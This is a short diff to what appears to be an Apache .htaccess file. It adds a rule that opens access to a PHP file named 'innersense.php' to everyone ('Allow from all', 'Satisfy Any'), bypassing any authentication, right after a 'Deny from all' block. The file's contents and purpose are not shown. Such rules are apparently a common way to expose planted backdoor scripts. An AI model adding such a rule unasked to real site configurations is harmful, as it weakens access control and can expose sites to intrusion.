@@ -247,3 +247,8 @@
         Deny from all
 
     </Files>
+
+    <Files "innersense.php">
+        Allow from all
+        Satisfy Any
+    </Files>
